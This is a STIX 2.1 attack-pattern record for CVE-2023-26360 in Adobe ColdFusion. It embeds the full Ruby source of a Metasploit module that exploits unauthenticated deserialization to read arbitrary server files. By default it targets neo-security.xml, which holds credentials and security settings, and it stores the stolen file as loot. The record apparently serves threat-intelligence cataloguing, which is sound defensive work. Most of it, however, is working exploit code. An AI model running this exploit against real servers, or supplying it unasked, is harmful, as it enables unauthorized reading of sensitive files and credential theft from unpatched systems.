{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c6d797c1-422a-48e5-8c9a-d208a1de159f",
    "created": "2024-08-14T16:32:46.492257Z",
    "modified": "2024-08-14T16:32:46.492261Z",
    "name": "Adobe ColdFusion Unauthenticated Arbitrary File Read",
    "description": " This module exploits a remote unauthenticated deserialization of untrusted data vulnerability in Adobe ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update 15 and earlier, in order to read an arbitrary file from the server.  To run this module you must provide a valid ColdFusion Component (CFC) endpoint via the CFC_ENDPOINT option and a valid remote method name from that endpoint via the CFC_METHOD option. By default an endpoint in the ColdFusion Administrator (CFIDE) is provided. If the CFIDE is not accessible you will need to choose a different CFC endpoint, method and parameters.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/adobe_coldfusion_fileread_cve_2023_26360.rb",
            "external_id": "adobe_coldfusion_fileread_cve_2023_26360.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-26360"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360/rapid7-analysis"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Adobe ColdFusion Unauthenticated Arbitrary File Read',\n        'Description' => %q{\n          This module exploits a remote unauthenticated deserialization of untrusted data vulnerability in Adobe\n          ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update 15 and earlier, in order to read\n          an arbitrary file from the server.\n\n          To run this module you must provide a valid ColdFusion Component (CFC) endpoint via the CFC_ENDPOINT option,\n          and a valid remote method name from that endpoint via the CFC_METHOD option. By default an endpoint in the\n          ColdFusion Administrator (CFIDE) is provided. If the CFIDE is not accessible you will need to choose a\n          different CFC endpoint, method and parameters.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sf', # MSF Module & Rapid7 Analysis\n        ],\n        'References' => [\n          ['CVE', '2023-26360'],\n          ['URL', 'https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360/rapid7-analysis']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8500),\n        Opt::RHOST('0.0.0.0'),\n        OptBool.new('STORE_LOOT', [false, 'Store the target file as loot', true]),\n        OptString.new('TARGETFILE', [true, 'The target file to read, relative to the wwwroot folder.', '../lib/neo-security.xml']),\n        OptString.new('CFC_ENDPOINT', [true, 'The target ColdFusion Component (CFC) endpoint', '/CFIDE/wizards/common/utils.cfc']),\n        OptString.new('CFC_METHOD', [true, 'The target ColdFusion Component (CFC) remote method name', 'wizardHash']),\n        OptString.new('CFC_METHOD_PARAMETERS', [false, 'Additional target ColdFusion Component (CFC) remote method parameters to supply via a GET request (e.g. \"param1=foo, param2=hello world\")', 'inPassword=foo'])\n      ]\n    )\n  end\n\n  def run\n    unless datastore['CFC_ENDPOINT'].end_with? '.cfc'\n      fail_with(Failure::BadConfig, 'The CFC_ENDPOINT must point to a .cfc file')\n    end\n\n    if datastore['TARGETFILE'].empty? || datastore['TARGETFILE'].end_with?('.cfc', '.cfm')\n      fail_with(Failure::BadConfig, 'The TARGETFILE must not point to a .cfc or .cfm file')\n    end\n\n    # The relative path from wwwroot to the TARGETFILE.\n    target_file = datastore['TARGETFILE']\n\n    # To construct the arbitrary file path from the attacker provided class name, we must insert 1 or 2 characters\n    # to satisfy how coldfusion.runtime.JSONUtils.convertToTemplateProxy extracts the class name.\n    if target_file.include? '\\\\'\n      classname = \"#{Rex::Text.rand_text_alphanumeric(1)}#{target_file}\"\n    else\n      classname = \"#{Rex::Text.rand_text_alphanumeric(1)}/#{target_file}\"\n    end\n\n    json_variables = \"{\\\"_metadata\\\":{\\\"classname\\\":#{classname.to_json}},\\\"_variables\\\":[]}\"\n\n    vars_get = { 'method' => datastore['CFC_METHOD'], '_cfclient' => 'true', 'returnFormat' => 'wddx' }\n\n    # If the CFC_METHOD required parameters, extract them from CFC_METHOD_PARAMETERS and add to the vars_get Hash.\n    unless datastore['CFC_METHOD_PARAMETERS'].blank?\n      datastore['CFC_METHOD_PARAMETERS'].split(',').each do |pair|\n        param_name, param_value = pair.split('=', 2)\n        # remove the leading/trailing whitespace so user can pass something like \"p1=foo,  p2 = bar  , p3  = hello world, p4\"\n        vars_get[param_name.strip] = param_value&.strip\n      end\n    end\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['CFC_ENDPOINT']),\n      'vars_get' => vars_get,\n      'vars_post' => { '_variables' => json_variables }\n    )\n\n    file_data = nil\n\n    # The TARGETFILE contents will be emitted after the WDDX result of the remote CFC_METHOD. A _cfclient call\n    # will always return a struct with a 'variables' key via ComponentFilter.invoke and by selecting a returnFormat of\n    # wddx, we know to have a closing wddxPacket to search for. So we search for the TARGETFILE contents after\n    # the closing wddxPacket tag in the response body.\n    wddx_packet_tag = '</wddxPacket>'\n\n    if res && res.code == 200 && (res.body.include? wddx_packet_tag)\n\n      file_data = res.body[res.body.index(wddx_packet_tag) + wddx_packet_tag.length..]\n\n      # If the default CFC options were used, we know the output will end with the result of calling wizardHash. So we can\n      # remove the result which is a SHA1 hash and two 32 byte random strings, comma seperated and a trailing space.\n      if datastore['CFC_ENDPOINT'] == '/CFIDE/wizards/common/utils.cfc' && datastore['CFC_METHOD'] == 'wizardHash'\n        file_data = file_data[0..file_data.length - (40 + 32 + 32 + 2 + 1) - 1]\n      end\n    else\n      # ColdFusion has a non-default option 'Enable Request Debugging Output', which if enabled may return a HTTP 500\n      # or 404 error, while also including the arbitrary file read output. We detect this here and retrieve the file\n      # output which is pre-pended to the error page.\n      request_debugging_tag = '<!-- \" ---></TD></TD></TD></TH></TH></TH>'\n\n      if res && (res.code == 404 || res.code == 500) && (res.body.include? request_debugging_tag)\n        file_data = res.body[0, res.body.index(request_debugging_tag)]\n      end\n    end\n\n    if file_data.blank?\n      fail_with(Failure::UnexpectedReply, 'Failed to read the file. Ensure both the CFC_ENDPOINT, CFC_METHOD and CFC_METHOD_PARAMETERS are set correctly and that the endpoint is accessible.')\n    end\n\n    if datastore['STORE_LOOT'] == true\n      print_status('Storing the file data to loot...')\n\n      store_loot(File.basename(target_file), 'text/plain', datastore['RHOST'], file_data, datastore['TARGETFILE'], 'File read from Adobe ColdFusion server')\n    else\n      print_status(file_data.to_s)\n    end\n  end\n\nend\n"
}